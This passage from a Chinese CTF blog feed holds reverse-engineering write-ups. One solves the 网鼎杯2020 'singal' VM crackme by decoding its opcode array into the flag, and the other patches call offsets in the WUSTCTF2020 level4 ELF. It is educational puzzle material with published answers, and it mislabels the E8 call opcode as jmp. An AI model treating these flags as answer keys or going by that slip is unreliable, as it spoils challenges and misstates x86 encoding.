class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x21</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x51</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x24</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x36</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x3F</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x72</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x18</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xA7</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x28</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x84</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x1E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;; </span><br><span class="line"><span class="keyword">int</span> a[]=&#123;<span class="number">10</span>,<span class="number">4</span>,<span class="number">16</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">32</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">12</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">33</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">32</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">81</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">36</span>,<span class="number">1</span>,<span class="number">12</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">37</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">54</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">65</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">32</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">37</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">32</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">65</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">34</span>,<span class="number">7</span>,<span class="number">63</span>,<span class="number">7</span>,<span class="number">52</span>,<span class="number">7</span>,<span class="number">50</span>,<span class="number">7</span>,<span class="number">114</span>,<span class="number">7</span>,<span class="number">51</span>,<span class="number">7</span>,<span class="number">24</span>,<span class="number">7</span>,<span class="number">-89</span>,<span class="number">7</span>,<span class="number">49</span>,<span class="number">7</span>,<span class="number">-15</span>,<span class="number">7</span>,<span class="number">40</span>,<span class="number">7</span>,<span class="number">-124</span>,<span class="number">7</span>,<span class="number">-63</span>,<span class="number">7</span>,<span class="number">30</span>,<span class="number">7</span>,<span class="number">122</span>&#125;;<span class="comment">//运行结果</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> *p=(<span class="keyword">int</span> *)s;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in"><span class="keyword">sizeof</span></span>(s)/<span class="number">4</span>;i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,*(p+i));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以很明显发现，这个数组刚好114。vm逆向基本是自己定义了指令集做运算的，所以这个不可能是flag，就应该是指令，那么至于指令集应该在这个函数有给解析，接着往下看。</p><h2 id="分析指令"><a href="#分析指令" class="headerlink" title="分析指令"></a>分析指令</h2><p>这里看了很久，里面有一个str char数组和一个char变量v4，然后其它的都是int变量了，一开始对4给int变量都初始化0了，大概率是做一个下标的。然后char数组应该是输入的flag，至于v4变量猜测可能是做一个中间数的，就相当于寄存器一样。</p><p>接下来看看这五个int变量干嘛的。</p><p>先是v9，发现它在每一个case当中都有+1或者+2。就很像我们的ip寄存器，每执行一次指令都往后移，然后这里+1+2应该是某些指令有操作数，导致指令宽度为2，那么v9就是指向当前指令的。而且循环退出条件就是v9&gt;=a2，a2是整个指令的长度。</p><p>其次v8,v8在所有指令中基本都是做str数组的下标，并且做下标的时候，str[v8]都是做源操作数，并且只在1号指令中有自增操作。</p><p>然后v7，这个很简单，只在7号指令中存在，并且做str[100+v7]这样的下标，然后和后一个操作数作比较，如果不等那么退出，那这个就应该是比较指针，7号指令应该是作比较的指令。大概率会做一个运算，运算结果就是str[100]往后的位置的变量。</p><p>接下来看看v6，只在1号指令中出现，并且是以str[100+v6]这样的下标，作为目的操作数。那这个大概率就是做一个变换然后运算结果保存到str[100]开始往后的位置。</p><p>最后一个是v5，只在8号指令出现，作用是取出v4的值保存在str[v5]中。这个v4我们前面分析就大概率是一个普通的寄存器，这里相当于就是取寄存器中的数还给内存一样的。</p><p>那么这些都了解之后就可以很轻松地写出指令的作用了，如下。</p><p><img src="/2021/11/03/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84%20singal%20writeup/2.png" alt="2"></p><p>接下来就手动解析指令，这个指令编码比较简单，无非就是从头开始，遇到2，3，4，5，7就取出后一个数一起与他编码，否则单独作为一个指令编码。</p><p>这个其实可以做程序算的，但是为了一开始理解方便，我也还是手算了。可以发现比较指令都集中在最后了，那么我们从头开始分析。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">10      //读取数据</span><br><span class="line">4,16    //取出str[0]^16---&gt;rax</span><br><span class="line">8       //rax---&gt;str[0]</span><br><span class="line">//str[0]^=16;</span><br><span class="line">3,5     //取出str[0]-5---&gt;rax</span><br><span class="line">1       //rax---&gt;str[100]</span><br><span class="line">//str[100]=str[0]-5;</span><br><span class="line">//根据后面的比较str[100]=34，所以(str[0]^16)-5==34</span><br><span class="line">//str[0]=55=&#x27;7&#x27;</span><br></pre></td></tr></table></figure><p>很容易算出来了str[0]=’7’。剩下的同理，因为位之间比较独立，并且它有一定规律，手撸还是很块就出来了的。</p><p>下面给出我做这个用的草稿。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">10      //读取数据</span><br><span class="line">4,16    //取出str[0]^16---&gt;rax</span><br><span class="line">8       //rax---&gt;str[0]</span><br><span class="line">//str[0]^=16;</span><br><span class="line">3,5     //取出str[0]-5---&gt;rax</span><br><span class="line">1       //rax---&gt;str[100]</span><br><span class="line">//str[100]=str[0]-5;</span><br><span class="line">//根据后面的比较str[100]=34，所以(str[0]^16)-5==34</span><br><span class="line">//str[0]=55=&#x27;7&#x27;</span><br><span class="line">4,32    //str[1]^32---&gt;rax</span><br><span class="line">8       //rax---&gt;str[1]</span><br><span class="line">//str[1]^=32;</span><br><span class="line">5,3     //str[1]*3---&gt;rax</span><br><span class="line">1       //rax---&gt;str[1]</span><br><span class="line">//str[101]=(str[1]^32)*3</span><br><span class="line">//str[101]=63</span><br><span class="line">//str[1]=53=&#x27;5&#x27;</span><br><span class="line">3,2     </span><br><span class="line">8       //str[2]-=2;</span><br><span class="line">11</span><br><span class="line">1       //str[102]=str[2]-1;</span><br><span class="line">//str[2]-3=52</span><br><span class="line">//str[2]=55=&#x27;7&#x27;</span><br><span class="line">12</span><br><span class="line">8       //str[3]+=1;</span><br><span class="line">4,4</span><br><span class="line">1       //str[103]=str[3]^4;</span><br><span class="line">//(str[3]+1)^4=50</span><br><span class="line">//str[3]=55=&#x27;5&#x27;</span><br><span class="line">5,3</span><br><span class="line">8       //str[4]*=3;</span><br><span class="line">3,33 </span><br><span class="line">1       //str[104]=str[4]-33;</span><br><span class="line">//(str[4]*3)-33=114</span><br><span class="line">//str(4)=49=&#x27;1&#x27;</span><br><span class="line">11</span><br><span class="line">8</span><br><span class="line">11</span><br><span class="line">1</span><br><span class="line">//str[5]-2=51</span><br><span class="line">//str[5]=53=&#x27;5&#x27;</span><br><span class="line">4,9</span><br><span class="line">8       //str[6]^=9;</span><br><span class="line">3,32</span><br><span class="line">1       //str[6]-=32;</span><br><span class="line">//(str[6]^9)-32=24</span><br><span class="line">//str[6]=49=&#x27;1&#x27;</span><br><span class="line">2,81    </span><br><span class="line">8       //str[7]+=81;</span><br><span class="line">4,36</span><br><span class="line">1       //str[7]^=36;</span><br><span class="line">//(str[7]+81)^36=-89;</span><br><span class="line">//str[7]=50=&#x27;2&#x27;</span><br><span class="line">12</span><br><span class="line">8       str[8]+=1;</span><br><span class="line">11</span><br><span class="line">1       str[8]-=1;</span><br><span class="line">str[8]=49=&#x27;1&#x27;</span><br><span class="line">5,2</span><br><span class="line">8       //str[9]*=2;</span><br><span class="line">2,37</span><br><span class="line">1       //str[9]+=37;</span><br><span class="line">//str[9]*2+37=-15</span><br><span class="line">//str[9]=102=&#x27;f&#x27;</span><br><span class="line">2,54</span><br><span class="line">8       //str[10]+=54;</span><br><span class="line">4,65</span><br><span class="line">1       //str[10]^=65;</span><br><span class="line">//(str[10]+54)^65=40</span><br><span class="line">//str[10]=51=&#x27;3&#x27;</span><br><span class="line">2,32</span><br><span class="line">8       //str[11]+=32;</span><br><span class="line">5,1</span><br><span class="line">1       //</span><br><span class="line">//str[11]+32=-124</span><br><span class="line">//str[11]=100=&#x27;d&#x27;</span><br><span class="line">5,3</span><br><span class="line">8       //str[12]*=3;</span><br><span class="line">2,37</span><br><span class="line">1       //str[12]+=37;</span><br><span class="line">//str[12]*3+37=-63</span><br><span class="line">//str[12]=52=&#x27;4&#x27;</span><br><span class="line">4,9     //str[13]^=9;</span><br><span class="line">8</span><br><span class="line">3,32    //str[13]-=32;</span><br><span class="line">1</span><br><span class="line">//(str[13]^9)-32=30;</span><br><span class="line">//str[13]=53=&#x27;7&#x27;</span><br><span class="line">2,65</span><br><span class="line">8       //str[14]+=65;</span><br><span class="line">12</span><br><span class="line">1       //str[14]++;</span><br><span class="line"></span><br><span class="line">//str[14]=56=&#x27;8&#x27;</span><br><span class="line">比较：</span><br><span class="line">7,34,7,63,7,52,7,50</span><br><span class="line">7,114,7,51,7,24</span><br><span class="line">7,-89,7,49,7,-15</span><br><span class="line">7,40,7,-124,7,-63</span><br><span class="line">7,30,7,122</span><br></pre></td></tr></table></figure><p>最后得出这个15位的key就是757515121f3d478 。这个程序基本用不到动态调试，最后就算要跑也只是检验我们的flag是否正确而已，那么我们跑一遍吧。</p><p><img src="/2021/11/03/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84%20singal%20writeup/3.png" alt="3"></p><p>最终提交的flag就是flag{757515121f3d478}</p><p>这题目在vmre中还是比较简单的，推荐入坑虚拟机逆向的师傅一定做做这个，然后自己粗心居然把11和12指令搞反了一开始，导致算出来的就一直不对，这个毛病还是得改改(捂脸</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;不知不觉做到了虚拟机逆向了，曾经我也只是听说，还未曾想也能自己做出。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="re" scheme="http://example.com/categories/ctf/re/"/>
    
    
  </entry>
  
  <entry>
    <title>WUSTCTF2020 level4 writeup</title>
    <link href="http://example.com/2021/11/02/WUSTCTF2020%20level4%20writeup/"/>
    <id>http://example.com/2021/11/02/WUSTCTF2020%20level4%20writeup/</id>
    <published>2021-11-02T02:00:00.000Z</published>
    <updated>2021-11-11T13:03:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>好久没刷re了，来刷点re啊。</p><span id="more"></span><p>buuctf的<a href="https://buuoj.cn/challenges#[WUSTCTF2020]level4">[WUSTCTF2020]level4</a></p><h2 id="静态分析文件"><a href="#静态分析文件" class="headerlink" title="静态分析文件"></a>静态分析文件</h2><p>下载发现是一个64位的elf文件，IDA打开分析。照例先看看明显的字符串明文，发现有left，right，然后还有三种打印(type1,type2,type3)。观察符号列表发现有type1和type2函数。跟进去发现跟我们二叉树的递归输出十分相似，并且type1 先递归了a1+1再递归a1+2，差不多他们就是左子树和右子树。那么type1就是一个后根遍历。然后type2是再中间输出的，是一个中根遍历，那么type3大概率就应该是先根遍历，这里他没有，那么先根遍历大概率就是flag。根据中序遍历和其它一个遍历可以求另外一个遍历，这个在数据结构课里有讲。</p><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>那么先运行一遍可以发现得到了两个结果</p><p><img src="/2021/11/02/WUSTCTF2020%20level4%20writeup/1.png" alt="1"></p><p>正解显然就是考一个数据结构嘛，但是一个题目总得有多种解法，这里我选择修改函数结构，让它从一个后序遍历变成先序遍历，这里需要patch elf我们先找到type2函数观察它的汇编代码</p><p><img src="/2021/11/02/WUSTCTF2020%20level4%20writeup/2.png" alt="2"></p><p>很明显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jz      short loc_4007FD</span><br></pre></td></tr></table></figure><p>这一条指令对应了if (*a1)的跳转，那么一直到最后的call putchar之前应该都是if范围内的东西，这里需要注意的是，函数调用要把之前的一切准备都算进来。定位找到字节码，然后交换位置，将开头到第二个call type2的指令和之后的到putchar指令对换位置，然后patch上去即可。</p><p>满心欢喜patch之后却发现没有得到想要的结果，为什么呢？</p><p>这里需要理解一下jmp跳转指令了，call和jmp两个指令实际上都属于无条件跳转指令，为什么加以区分呢，call它在跳转之后一定会有一个返回的动作，而jmp则不需要。如果自己去尝试编码的话就会发现它的编码开头都是E8 +4个字节定位代码位置。然后它是怎么定位的呢？首先E8开始，之后四个字节为小端表示这条指令(jmp xxx)的下一条指令的位置到 目标代码地址位置的差值(后者减前者)。举个例子，比如我有如下的机器代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nop  90//1</span><br><span class="line">nop  90//2</span><br><span class="line">nop  90//3</span><br><span class="line">nop  90//4</span><br><span class="line">jmp xxx E8 ?? ?? ?? ??//5</span><br><span class="line">nop  90//6</span><br><span class="line">nop  90//7</span><br><span class="line">nop  90//8</span><br></pre></td></tr></table></figure><p>当编码的4个字节都为00时，那么这条jmp指令的跳转位置就是第六条指令。</p><p>如果为01 00 00 00时，那么这条指令跳转的位置是第七条指令。</p><p>如果为02 00 00 00时，那么这条指令跳转的位置是第8条指令。</p><p>以此类推，注意里面的数值表示字节，而不是指令的数目，如果想往回挑，那么则需要用相应负数的补码表示偏移。</p><p>讲完这些之后就能理解为什么简单的交换代码位置会导致patch失败了，因为指令的地址改变了，所以原来这么多偏移量它已经对应不上相应的函数了。因此需要自己手动操作一下，调整call指令的偏移使之成功patch，这里建议使用keypatch插件，在更改这条指令只需直接输入call 地址，则可以快速完成patch，不用自己算偏移编码。</p><p><img src="/2021/11/02/WUSTCTF2020%20level4%20writeup/3.png" alt="3"></p><p>可以看到代码逻辑按照我们预期的方向更改了，那么我们跑一下，直接输出flag。</p><p><img 